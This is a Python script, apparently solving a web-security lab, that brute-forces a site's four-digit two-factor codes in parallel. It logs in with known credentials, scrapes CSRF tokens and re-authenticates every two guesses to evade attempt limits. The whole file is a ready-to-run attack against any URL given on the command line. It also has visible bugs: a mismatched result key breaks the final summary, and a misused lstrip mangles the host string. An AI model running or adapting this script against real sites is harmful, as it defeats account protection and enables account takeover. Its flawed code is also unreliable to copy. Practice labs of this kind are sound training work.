import multiprocessing
import sys

import requests
from bs4 import BeautifulSoup

from timeDecorator import time_decorator

# Const that enables / disables noisy prints made throughout program execution.
DEBUG_MODE = False
# A separate const that reports progress running attack.
REPORT_POSITION = False
# Total number of possible 2fa codes, 0 -> 9999, so 10k
TOTAL_NUM_CODES = 10000
# Default number of worker processes to find 2fa code, if none is provided as argument to program invocation.
DEFAULT_WORKERS = 10

# Initial credential values that we know in advance
PROVIDED_USER = 'carlos'
PROVIDED_PW = 'montoya'


# Pull site info from cli args -- drop https:// if included
try:
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
    raise IndexError("Missing ctf site url in command line arguments.\n")
# Grab number of procs to run concurrently, or use default value.
try:
    num_procs = int(sys.argv[2])
except IndexError:
    print("Number of worker processes not specified, defaulting to ", DEFAULT_WORKERS)
    num_procs = DEFAULT_WORKERS

# Find out how many codes each worker will try
functional_unit_size = int(TOTAL_NUM_CODES / num_procs)

s = requests.Session()
login_url = f'https://{site}/login'


# Small wrapper for printing based on value of DEBUG_MODE
def debug_print(text):
    if DEBUG_MODE:
        print(text)


# Use BeautifulSoup's html parser to grab the csrf token from some html string
def parse_tree_for_csrf(text):
    parser = BeautifulSoup(text, 'html.parser')
    try:
        return parser.find('input', {'name': 'csrf'}).get('value')
    except AttributeError:
        if 'Gateway Timeout' in text:
            debug_print("CTF expired; Please restart CTF or else attack script will always fail.")


# Grab the csrf token gained from the initial login page for a new session.
def get_login_page_csrf():
    resp = s.get(login_url)
    return parse_tree_for_csrf(resp.text)


# Login to user we have credentials for.
def login(uname, pw, csrf_token):
    login_data = {
        'csrf': csrf_token,
        'username': uname,
        'password': pw
    }
    debug_print(f'Logging in as carlos:montoya')
    response = s.post(login_url, data=login_data)
    debug_print(f'Login response: {response.text}')
    return response.text


# Grab response after successful login to grab the csrf token for interaction with 2fa login page
#   Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
# Returns:
#   List of dicts containing code + status pairs.
def try_2fa_functional_unit(process_number):
    # Arg `process_number` used to extrapolate which number range this functional_unit will try.
    # Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)
    start_range = (process_number - 1) * functional_unit_size

    # If this worker is handling the final indices, make its range go all the way to TOTAL
    # to account for any rounding error.
    if (process_number * functional_unit_size) > (TOTAL_NUM_CODES - functional_unit_size):
        end_range = TOTAL_NUM_CODES
    else:
        end_range = process_number * functional_unit_size - 1

    code_results = []  # Collects code attempted and status
    # Get initial login page csrf
    csrf = get_login_page_csrf()

    # Main loop, try all 2fa codes in this worker's range.
    for code_num in range(start_range, end_range):
        # Only grab new csrf on evens, so a csrf is used at most twice.
        if code_num % 2 == 0:
            csrf = get_login_page_csrf()

        # Use that csrf for login POST
        response_text = login(
            uname=PROVIDED_USER,
            pw=PROVIDED_PW,
            csrf_token=csrf
        )
        # Grab csrf for 2fa POST
        csrf = parse_tree_for_csrf(response_text)

        # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
        login2_url = f'https://{site}/login2'
        code = str(code_num).zfill(4)
        if REPORT_POSITION:
            print(f'trying 2fa code: {code}')
        login2data = {
            'csrf': csrf,
            'mfa-code': code
        }
        response = s.post(login2_url, data=login2data, allow_redirects=False)
        status = response.status_code
        if status == 302:
            print(f'2fa valid with response code {status}: Use code <{code}>')
        else:
            debug_print(f'2fa invalid with response code: {status}')

        # store result of this attempt before continuing
        code_results.append({
            'status_code': status,
            'mfa-code': code
        })

    return code_results


# Kicks off `num_procs` number of processes which will each run `try_2fa_functional_unit`
# Returns: A flattened list of response-status/2fa-code pairs
def concurrent_brute_force_attack(number_of_workers):
    p = multiprocessing.Pool(number_of_workers)
    workers_numbers = range(1, number_of_workers+1)
    collected_results_list = p.map(try_2fa_functional_unit, workers_numbers)

    p.close()
    flattened = []
    for group in collected_results_list:
        flattened.extend(group)
    return flattened


@time_decorator
def run_main_attack():
    # Execute attack
    results = concurrent_brute_force_attack(num_procs)
    # Filter for any dicts with 'success' status code, a.k.a status code indicating redirect and correct guess.
    successes = filter(lambda x: x['status-code'] == 302, results)

    for success in successes:
        print(f'Found successful 2fa code for login: {success["mfa-code"]}')


run_main_attack()
